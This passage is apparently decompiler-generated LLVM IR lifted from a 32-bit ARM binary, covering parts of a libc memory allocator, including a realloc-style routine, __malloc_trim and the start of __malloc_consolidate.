  %v1_13120 = add i32 %v0_13120, -4
  store i32 %v1_13120, i32* @r2, align 4
  %v3_13124 = udiv i32 %v1_13120, 4
  store i32 %v3_13124, i32* @ip, align 4
  %tmp37 = and i32 %v1_13120, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1312c = icmp ult i32 %v1_13120, 36
  %v3_1312c = or i1 %tmp38, %v2_1312c
  %v0_1313c = load i32, i32* @r5, align 4
  br i1 %v3_1312c, label %dec_label_pc_1313c, label %dec_label_pc_13130

dec_label_pc_13130:                               ; preds = %dec_label_pc_13120
  store i32 %v0_1313c, i32* @r1, align 4
  %v0_13134 = call i32 @memcpy()
  store i32 %v0_13134, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1313c:                               ; preds = %dec_label_pc_13120
  %v1_1313c = inttoptr i32 %v0_1313c to i32*
  %v2_1313c = load i32, i32* %v1_1313c, align 4
  store i32 %v2_1313c, i32* %r3.global-to-local, align 4
  %v2_13140 = inttoptr i32 %v0_130f8 to i32*
  store i32 %v2_1313c, i32* %v2_13140, align 4
  %v0_13144 = load i32, i32* @r5, align 4
  %v1_13144 = add i32 %v0_13144, 4
  %v2_13144 = inttoptr i32 %v1_13144 to i32*
  %v3_13144 = load i32, i32* %v2_13144, align 4
  store i32 %v3_13144, i32* %r3.global-to-local, align 4
  %v1_13148 = load i32, i32* %r1.global-to-local, align 4
  %v2_13148 = add i32 %v1_13148, 4
  %v3_13148 = inttoptr i32 %v2_13148 to i32*
  store i32 %v3_13144, i32* %v3_13148, align 4
  %v0_1314c = load i32, i32* @r5, align 4
  %v1_1314c = add i32 %v0_1314c, 8
  %v2_1314c = inttoptr i32 %v1_1314c to i32*
  %v3_1314c = load i32, i32* %v2_1314c, align 4
  store i32 %v3_1314c, i32* %r3.global-to-local, align 4
  %v0_13150 = load i32, i32* @ip, align 4
  %v1_13154 = load i32, i32* %r1.global-to-local, align 4
  %v2_13154 = add i32 %v1_13154, 8
  %v3_13154 = inttoptr i32 %v2_13154 to i32*
  store i32 %v3_1314c, i32* %v3_13154, align 4
  %tmp39 = icmp ult i32 %v0_13150, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_1313c
  %v0_1315c = load i32, i32* @r5, align 4
  %v1_1315c = add i32 %v0_1315c, 12
  %v2_1315c = inttoptr i32 %v1_1315c to i32*
  %v3_1315c = load i32, i32* %v2_1315c, align 4
  store i32 %v3_1315c, i32* %r3.global-to-local, align 4
  %v1_13160 = load i32, i32* %r1.global-to-local, align 4
  %v2_13160 = add i32 %v1_13160, 12
  %v3_13160 = inttoptr i32 %v2_13160 to i32*
  store i32 %v3_1315c, i32* %v3_13160, align 4
  %v0_13164 = load i32, i32* @r5, align 4
  %v1_13164 = add i32 %v0_13164, 16
  %v2_13164 = inttoptr i32 %v1_13164 to i32*
  %v3_13164 = load i32, i32* %v2_13164, align 4
  store i32 %v3_13164, i32* %r3.global-to-local, align 4
  %v0_13168 = load i32, i32* @ip, align 4
  %v1_1316c = load i32, i32* %r1.global-to-local, align 4
  %v2_1316c = add i32 %v1_1316c, 16
  %v3_1316c = inttoptr i32 %v2_1316c to i32*
  store i32 %v3_13164, i32* %v3_1316c, align 4
  %tmp40 = icmp ult i32 %v0_13168, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %dec_label_pc_1315c
  %v0_13174 = load i32, i32* @r5, align 4
  %v1_13174 = add i32 %v0_13174, 20
  %v2_13174 = inttoptr i32 %v1_13174 to i32*
  %v3_13174 = load i32, i32* %v2_13174, align 4
  store i32 %v3_13174, i32* %r3.global-to-local, align 4
  %v1_13178 = load i32, i32* %r1.global-to-local, align 4
  %v2_13178 = add i32 %v1_13178, 20
  %v3_13178 = inttoptr i32 %v2_13178 to i32*
  store i32 %v3_13174, i32* %v3_13178, align 4
  %v0_1317c = load i32, i32* @r5, align 4
  %v1_1317c = add i32 %v0_1317c, 24
  %v2_1317c = inttoptr i32 %v1_1317c to i32*
  %v3_1317c = load i32, i32* %v2_1317c, align 4
  store i32 %v3_1317c, i32* %r3.global-to-local, align 4
  %v1_13180 = load i32, i32* %r1.global-to-local, align 4
  %v2_13180 = add i32 %v1_13180, 24
  %v3_13180 = inttoptr i32 %v2_13180 to i32*
  store i32 %v3_1317c, i32* %v3_13180, align 4
  %v0_13184 = load i32, i32* @ip, align 4
  %v7_13184 = icmp eq i32 %v0_13184, 9
  br i1 %v7_13184, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13174
  %v1_13188 = load i32, i32* @r5, align 4
  %v2_13188 = add i32 %v1_13188, 28
  %v3_13188 = inttoptr i32 %v2_13188 to i32*
  %v4_13188 = load i32, i32* %v3_13188, align 4
  store i32 %v4_13188, i32* %r3.global-to-local, align 4
  %v2_1318c = load i32, i32* %r1.global-to-local, align 4
  %v3_1318c = add i32 %v2_1318c, 28
  %v4_1318c = inttoptr i32 %v3_1318c to i32*
  store i32 %v4_13188, i32* %v4_1318c, align 4
  %v1_13190 = load i32, i32* @r5, align 4
  %v2_13190 = add i32 %v1_13190, 32
  %v3_13190 = inttoptr i32 %v2_13190 to i32*
  %v4_13190 = load i32, i32* %v3_13190, align 4
  store i32 %v4_13190, i32* %r3.global-to-local, align 4
  %v2_13194 = load i32, i32* %r1.global-to-local, align 4
  %v3_13194 = add i32 %v2_13194, 32
  %v4_13194 = inttoptr i32 %v3_13194 to i32*
  store i32 %v4_13190, i32* %v4_13194, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13174, %dec_label_pc_1315c, %dec_label_pc_1313c, %dec_label_pc_13130, %bb32
  %v0_13198 = load i32, i32* @r5, align 4
  store i32 %v0_13198, i32* @r0, align 4
  %v0_1319c = call i32 @free()
  store i32 %v0_1319c, i32* %r0.global-to-local, align 4
  %v0_131a0 = load i32, i32* @r7, align 4
  %v1_131a0 = add i32 %v0_131a0, 8
  store i32 %v1_131a0, i32* @r4, align 4
  br label %dec_label_pc_132dc

dec_label_pc_131a8:                               ; preds = %bb30, %.thread2, %dec_label_pc_130e8
  %v0_131bc = phi i32 [ %v3_13118, %.thread2 ], [ %v1_13030, %bb30 ], [ %v1_131a8.pre, %dec_label_pc_130e8 ]
  %v0_131a8 = load i32, i32* @sb, align 4
  %v2_131a8 = sub i32 %v0_131bc, %v0_131a8
  store i32 %v2_131a8, i32* %r1.global-to-local, align 4
  %v0_131b0 = load i32, i32* @sl, align 4
  %v1_131b0 = add i32 %v0_131b0, 4
  %v2_131b0 = inttoptr i32 %v1_131b0 to i32*
  %v3_131b0 = load i32, i32* %v2_131b0, align 4
  %tmp41 = icmp ugt i32 %v2_131a8, 15
  %v1_131d8 = urem i32 %v3_131b0, 2
  store i32 %v1_131d8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_131d8, label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131a8
  %v2_131bc = or i32 %v1_131d8, %v0_131bc
  store i32 %v2_131bc, i32* %r3.global-to-local, align 4
  store i32 %v2_131bc, i32* %v2_131b0, align 4
  %v0_131c4 = load i32, i32* @sl, align 4
  %v1_131c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_131c4 = add i32 %v1_131c4, %v0_131c4
  store i32 %v2_131c4, i32* %r2.global-to-local, align 4
  %v1_131c8 = add i32 %v2_131c4, 4
  %v2_131c8 = inttoptr i32 %v1_131c8 to i32*
  %v3_131c8 = load i32, i32* %v2_131c8, align 4
  %v1_131cc = or i32 %v3_131c8, 1
  store i32 %v1_131cc, i32* %r3.global-to-local, align 4
  store i32 %v1_131cc, i32* %v2_131c8, align 4
  br label %dec_label_pc_13208

dec_label_pc_131d8:                               ; preds = %dec_label_pc_131a8
  %v2_131dc = add i32 %v0_131b0, %v0_131a8
  store i32 %v2_131dc, i32* %r0.global-to-local, align 4
  %v2_131e0 = or i32 %v1_131d8, %v0_131a8
  store i32 %v2_131e0, i32* %r3.global-to-local, align 4
  %v1_131e4 = or i32 %v2_131a8, 1
  store i32 %v1_131e4, i32* %r2.global-to-local, align 4
  store i32 %v2_131e0, i32* %v2_131b0, align 4
  %v0_131ec = load i32, i32* %r2.global-to-local, align 4
  %v1_131ec = load i32, i32* %r0.global-to-local, align 4
  %v2_131ec = add i32 %v1_131ec, 4
  %v3_131ec = inttoptr i32 %v2_131ec to i32*
  store i32 %v0_131ec, i32* %v3_131ec, align 4
  %v0_131f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_131f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_131f0 = add i32 %v1_131f0, %v0_131f0
  store i32 %v2_131f0, i32* %r2.global-to-local, align 4
  %v1_131f4 = add i32 %v2_131f0, 4
  %v2_131f4 = inttoptr i32 %v1_131f4 to i32*
  %v3_131f4 = load i32, i32* %v2_131f4, align 4
  %v1_131f8 = or i32 %v3_131f4, 1
  store i32 %v1_131f8, i32* %r3.global-to-local, align 4
  store i32 %v1_131f8, i32* %v2_131f4, align 4
  %v0_13200 = load i32, i32* %r0.global-to-local, align 4
  %v1_13200 = add i32 %v0_13200, 8
  store i32 %v1_13200, i32* @r0, align 4
  %v0_13204 = call i32 @free()
  store i32 %v0_13204, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_131b8, %dec_label_pc_131d8
  %v0_13208 = load i32, i32* @sl, align 4
  %v1_13208 = add i32 %v0_13208, 8
  store i32 %v1_13208, i32* @r4, align 4
  br label %dec_label_pc_132dc

dec_label_pc_13210:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_13218 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_13218, i32* @r8, align 4
  %v2_1321c = inttoptr i32 %v1_1302c to i32*
  %v3_1321c = load i32, i32* %v2_1321c, align 4
  store i32 %v3_1321c, i32* @r4, align 4
  %v1_13220 = add i32 %v4_13218, 860
  %v2_13220 = inttoptr i32 %v1_13220 to i32*
  %v3_13220 = load i32, i32* %v2_13220, align 4
  %v1_13224 = add i32 %v3_1321c, 4
  %v1_13228 = add i32 %v3_13220, -1
  store i32 %v1_13228, i32* %r2.global-to-local, align 4
  %v2_1322c = add i32 %v1_13224, %v1_13228
  %v1_13230 = load i32, i32* @sb, align 4
  %v2_13230 = add i32 %v2_1322c, %v1_13230
  store i32 %v2_13230, i32* %r3.global-to-local, align 4
  %v2_13234 = sub i32 0, %v3_13220
  %v3_13234 = and i32 %v2_13230, %v2_13234
  store i32 %v3_13234, i32* @r7, align 4
  %v2_13238 = sub i32 %v3_13234, %v3_1321c
  store i32 %v2_13238, i32* @fp, align 4
  %v9_1323c = icmp eq i32 %v1_13030, %v2_13238
  br i1 %v9_1323c, label %dec_label_pc_132b0, label %dec_label_pc_13244

dec_label_pc_13244:                               ; preds = %dec_label_pc_13210
  %v2_13244 = sub i32 %v1_1302c, %v3_1321c
  store i32 %v2_13244, i32* %r0.global-to-local, align 4
  %v2_13248 = add i32 %v3_1321c, %v1_13030
  store i32 %v2_13248, i32* %r1.global-to-local, align 4
  store i32 %v3_13234, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13254 = call i32 @mremap(i32 %v2_13244, i32 %v2_13248, i32 %v3_13234, i32 1)
  store i32 %v4_13254, i32* %r0.global-to-local, align 4
  %v7_13258 = icmp eq i32 %v4_13254, -1
  br i1 %v7_13258, label %dec_label_pc_132a4, label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %dec_label_pc_13244
  %v1_13260 = load i32, i32* @r4, align 4
  %v2_13260 = add i32 %v1_13260, %v4_13254
  store i32 %v2_13260, i32* %r0.global-to-local, align 4
  %v0_13264 = load i32, i32* @fp, align 4
  %v1_13264 = or i32 %v0_13264, 2
  store i32 %v1_13264, i32* %r3.global-to-local, align 4
  %v2_13268 = add i32 %v2_13260, 4
  %v3_13268 = inttoptr i32 %v2_13268 to i32*
  store i32 %v1_13264, i32* %v3_13268, align 4
  %v0_1326c = load i32, i32* @r8, align 4
  %v1_1326c = add i32 %v0_1326c, 868
  %v2_1326c = inttoptr i32 %v1_1326c to i32*
  %v3_1326c = load i32, i32* %v2_1326c, align 4
  store i32 %v3_1326c, i32* %r3.global-to-local, align 4
  %v1_13270 = add i32 %v0_1326c, 880
  %v2_13270 = inttoptr i32 %v1_13270 to i32*
  %v3_13270 = load i32, i32* %v2_13270, align 4
  store i32 %v3_13270, i32* %r2.global-to-local, align 4
  %v0_13274 = load i32, i32* @r6, align 4
  %v2_13274 = sub i32 %v3_1326c, %v0_13274
  store i32 %v2_13274, i32* %r3.global-to-local, align 4
  %v1_13278 = load i32, i32* @r7, align 4
  %v2_13278 = add i32 %v1_13278, %v2_13274
  store i32 %v2_13278, i32* %r1.global-to-local, align 4
  %v1_1327c = add i32 %v0_1326c, 872
  %v2_1327c = inttoptr i32 %v1_1327c to i32*
  %v3_1327c = load i32, i32* %v2_1327c, align 4
  store i32 %v3_1327c, i32* %r3.global-to-local, align 4
  %v1_13284 = add i32 %v0_1326c, 884
  %v2_13284 = inttoptr i32 %v1_13284 to i32*
  %v3_13284 = load i32, i32* %v2_13284, align 4
  store i32 %v3_13284, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_13278, %v3_13270
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13260
  store i32 %v2_13278, i32* %v2_13270, align 4
  %v0_1328c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1328c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13260, %bb33
  %v1_1328c = phi i32 [ %v0_1326c, %dec_label_pc_13260 ], [ %v1_1328c.pre, %bb33 ]
  %v0_1328c = phi i32 [ %v2_13278, %dec_label_pc_13260 ], [ %v0_1328c.pre, %bb33 ]
  %v2_1328c = add i32 %v1_1328c, 868
  %v3_1328c = inttoptr i32 %v2_1328c to i32*
  store i32 %v0_1328c, i32* %v3_1328c, align 4
  %v0_13290 = load i32, i32* %r1.global-to-local, align 4
  %v1_13290 = load i32, i32* %r3.global-to-local, align 4
  %v2_13290 = add i32 %v1_13290, %v0_13290
  store i32 %v2_13290, i32* %r1.global-to-local, align 4
  %v1_13294 = load i32, i32* %r2.global-to-local, align 4
  %v0_13298 = load i32, i32* %r0.global-to-local, align 4
  %v1_13298 = add i32 %v0_13298, 8
  store i32 %v1_13298, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13290, %v1_13294
  br i1 %tmp43, label %bb35, label %dec_label_pc_132dc

bb35:                                             ; preds = %bb34
  %v5_1329c = load i32, i32* @r8, align 4
  %v6_1329c = add i32 %v5_1329c, 884
  %v7_1329c = inttoptr i32 %v6_1329c to i32*
  store i32 %v2_13290, i32* %v7_1329c, align 4
  br label %dec_label_pc_132dc

dec_label_pc_132a4:                               ; preds = %dec_label_pc_13244
  %v0_132a4 = load i32, i32* @sb, align 4
  %v1_132a4 = add i32 %v0_132a4, 4
  store i32 %v1_132a4, i32* %r3.global-to-local, align 4
  %v0_132a8 = load i32, i32* @r6, align 4
  %v3_132a8 = icmp ult i32 %v0_132a8, %v1_132a4
  br i1 %v3_132a8, label %dec_label_pc_132b8, label %dec_label_pc_132a4.dec_label_pc_132b0_crit_edge

dec_label_pc_132a4.dec_label_pc_132b0_crit_edge:  ; preds = %dec_label_pc_132a4
  %v0_132b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_132a4.dec_label_pc_132b0_crit_edge, %dec_label_pc_13210
  %v0_132b0 = phi i32 [ %v0_132b0.pre, %dec_label_pc_132a4.dec_label_pc_132b0_crit_edge ], [ %v0_13018, %dec_label_pc_13210 ]
  store i32 %v0_132b0, i32* @r4, align 4
  br label %dec_label_pc_132dc

dec_label_pc_132b8:                               ; preds = %dec_label_pc_132a4
  %v1_132b8 = add i32 %v0_132a4, -7
  store i32 %v1_132b8, i32* @r0, align 4
  %v0_132bc = call i32 @malloc()
  store i32 %v0_132bc, i32* @r0, align 4
  store i32 %v0_132bc, i32* @r4, align 4
  %v2_132c0 = icmp eq i32 %v0_132bc, 0
  br i1 %v2_132c0, label %dec_label_pc_132dc, label %dec_label_pc_132c8

dec_label_pc_132c8:                               ; preds = %dec_label_pc_132b8
  %v0_132c8 = load i32, i32* @r6, align 4
  %v1_132c8 = add i32 %v0_132c8, -8
  store i32 %v1_132c8, i32* @r2, align 4
  %v0_132cc = load i32, i32* @r5, align 4
  store i32 %v0_132cc, i32* @r1, align 4
  %v0_132d0 = call i32 @memcpy()
  %v0_132d4 = load i32, i32* @r5, align 4
  store i32 %v0_132d4, i32* @r0, align 4
  %v0_132d8 = call i32 @free()
  store i32 %v0_132d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132dc

dec_label_pc_132dc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_132b8, %dec_label_pc_132b0, %dec_label_pc_13208, %.thread6, %dec_label_pc_13078, %dec_label_pc_132c8
  store i32 %v2_12fc4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v4_132ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_132ec)
  br label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %dec_label_pc_12ff8, %dec_label_pc_12fa0, %dec_label_pc_12f88, %dec_label_pc_132dc
  %v0_132f8 = load i32, i32* @r4, align 4
  store i32 %v0_132f8, i32* %r0.global-to-local, align 4
  store i32 %v3_12f68, i32* @r4, align 4
  store i32 %v6_12f68, i32* @r5, align 4
  store i32 %v9_12f68, i32* @r6, align 4
  store i32 %v12_12f68, i32* @r7, align 4
  store i32 %v15_12f68, i32* @r8, align 4
  store i32 %v18_12f68, i32* @sb, align 4
  store i32 %v21_12f68, i32* @sl, align 4
  store i32 %v24_12f68, i32* @fp, align 4
  store i32 %v27_12f68, i32* @lr, align 4
  ret i32 %v0_132f8

; uselistorder directives
  uselistorder i32 %v2_13290, { 1, 0, 2 }
  uselistorder i32 %v2_13278, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13254, { 1, 0, 2 }
  uselistorder i32 %v3_13234, { 1, 0, 2, 3 }
  uselistorder i32 %v1_131d8, { 2, 1, 0 }
  uselistorder i32 %v2_131a8, { 1, 0, 2 }
  uselistorder i32 %v0_1313c, { 1, 0 }
  uselistorder i32 %v0_130f8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1305c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13054, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13038, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13030, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1302c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1301c, { 1, 0 }
  uselistorder i32 %v0_13018, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12ff0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_132f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_132dc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_13208, { 1, 0 }
  uselistorder label %dec_label_pc_131a8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_130f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_130e8, { 1, 0 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1330c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1330c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1330c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1330c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_1330c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_13320.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13320.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_13324.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_1330c, %bb
  %v4_13324 = phi i32 [ %v4_13324.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_1330c ], [ 0, %bb ]
  ret i32 %v4_13324

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_13328 = add i32 %arg2, 44
  %v2_13328 = inttoptr i32 %v1_13328 to i32*
  %v3_13328 = load i32, i32* %v2_13328, align 4
  %v12_1332c = load i32, i32* @r7, align 4
  %v1_13330 = add i32 %v3_13328, 4
  %v2_13330 = inttoptr i32 %v1_13330 to i32*
  %v3_13330 = load i32, i32* %v2_13330, align 4
  %v1_13334 = add i32 %arg2, 860
  %v2_13334 = inttoptr i32 %v1_13334 to i32*
  %v3_13334 = load i32, i32* %v2_13334, align 4
  store i32 %v3_13334, i32* @r4, align 4
  %v1_13338 = and i32 %v3_13330, -4
  store i32 %v1_13338, i32* @r6, align 4
  %v1_1333c = add i32 %v1_13338, -17
  %v2_13340 = add i32 %v1_1333c, %v3_13334
  store i32 %arg2, i32* @r5, align 4
  %v2_1334c = sub i32 %v2_13340, %arg1
  store i32 %v3_13334, i32* %r1.global-to-local, align 4
  %v2_13354 = udiv i32 %v2_1334c, %v3_13334
  %v1_13358 = add i32 %v2_13354, -1
  store i32 %v1_13358, i32* %r0.global-to-local, align 4
  %v2_1335c = mul i32 %v1_13358, %v3_13334
  store i32 %v2_1335c, i32* @r7, align 4
  %v2_13360 = icmp eq i32 %v2_1335c, 0
  store i1 %v2_13360, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_1335c, 1
  br i1 %tmp8, label %dec_label_pc_133c8, label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1336c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1336c, i32* %r0.global-to-local, align 4
  %v0_13370 = load i32, i32* @r5, align 4
  %v1_13370 = add i32 %v0_13370, 44
  %v2_13370 = inttoptr i32 %v1_13370 to i32*
  %v3_13370 = load i32, i32* %v2_13370, align 4
  %v0_13374 = load i32, i32* @r6, align 4
  %v2_13374 = add i32 %v0_13374, %v3_13370
  %v9_13378 = icmp eq i32 %v1_1336c, %v2_13374
  store i1 %v9_13378, i1* @cpsr_z, align 1
  store i32 %v1_1336c, i32* @r4, align 4
  br i1 %v9_13378, label %dec_label_pc_13384, label %dec_label_pc_133c8

dec_label_pc_13384:                               ; preds = %dec_label_pc_13368
  %v0_13384 = load i32, i32* @r7, align 4
  %v1_13384 = sub i32 0, %v0_13384
  store i32 %v1_13384, i32* %r0.global-to-local, align 4
  %v1_13388 = call i32 @__GI_sbrk(i32 %v1_13384)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13390 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13390, i32* %r0.global-to-local, align 4
  %v7_13394 = icmp eq i32 %v1_13390, -1
  store i1 %v7_13394, i1* @cpsr_z, align 1
  br i1 %v7_13394, label %dec_label_pc_133c8, label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_13384
  %v0_1339c = load i32, i32* @r4, align 4
  %v2_1339c = sub i32 %v0_1339c, %v1_13390
  store i32 %v2_1339c, i32* %r0.global-to-local, align 4
  %v9_1339c = icmp eq i32 %v0_1339c, %v1_13390
  store i1 %v9_1339c, i1* @cpsr_z, align 1
  br i1 %v9_1339c, label %dec_label_pc_133c8, label %dec_label_pc_133a4

dec_label_pc_133a4:                               ; preds = %dec_label_pc_1339c
  %v0_133a4 = load i32, i32* @r5, align 4
  %v1_133a4 = add i32 %v0_133a4, 872
  %v2_133a4 = inttoptr i32 %v1_133a4 to i32*
  %v3_133a4 = load i32, i32* %v2_133a4, align 4
  %v1_133a8 = load i32, i32* @r6, align 4
  %v2_133a8 = sub i32 %v1_133a8, %v2_1339c
  store i32 %v2_133a8, i32* %r2.global-to-local, align 4
  %v1_133ac = add i32 %v0_133a4, 44
  %v2_133ac = inttoptr i32 %v1_133ac to i32*
  %v3_133ac = load i32, i32* %v2_133ac, align 4
  store i32 %v3_133ac, i32* %r1.global-to-local, align 4
  %v2_133b0 = sub i32 %v3_133a4, %v2_1339c
  %v1_133b4 = or i32 %v2_133a8, 1
  store i32 %v1_133b4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_133b0, i32* %v2_133a4, align 4
  %v0_133c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_133c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_133c0 = add i32 %v1_133c0, 4
  %v3_133c0 = inttoptr i32 %v2_133c0 to i32*
  store i32 %v0_133c0, i32* %v3_133c0, align 4
  %v1_133d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133cc

dec_label_pc_133c8:                               ; preds = %dec_label_pc_13368, %dec_label_pc_1339c, %dec_label_pc_13384, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133cc

dec_label_pc_133cc:                               ; preds = %dec_label_pc_133a4, %dec_label_pc_133c8
  %v1_133d4 = phi i32 [ %v1_133d4.pre, %dec_label_pc_133a4 ], [ 0, %dec_label_pc_133c8 ]
  store i32 %v12_1332c, i32* @r7, align 4
  ret i32 %v1_133d4

; uselistorder directives
  uselistorder i1 %v7_13394, { 1, 0 }
  uselistorder i32 %v1_13390, { 2, 1, 0, 3 }
  uselistorder i32 %v3_13334, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_133cc, { 1, 0 }
  uselistorder label %dec_label_pc_133c8, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_133d8 = load i32, i32* @r4, align 4
  store i32 %v3_133d8, i32* %stack_var_-36, align 4
  %v0_133dc = load i32, i32* @r0, align 4
  %v1_133dc = inttoptr i32 %v0_133dc to i32*
  %v2_133dc = load i32, i32* %v1_133dc, align 4
  store i32 %v2_133dc, i32* %r3.global-to-local, align 4
  %v2_133e0 = icmp eq i32 %v2_133dc, 0
  store i32 %v0_133dc, i32* @r4, align 4
  br i1 %v2_133e0, label %dec_label_pc_13518.preheader, label %dec_label_pc_133f4

dec_label_pc_13518.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1352025 = add i32 %v0_133dc, 52
  store i32 %v1_1352025, i32* %r3.global-to-local, align 4
  %v2_1352826 = add i32 %v0_133dc, 60
  %v3_1352827 = inttoptr i32 %v2_1352826 to i32*
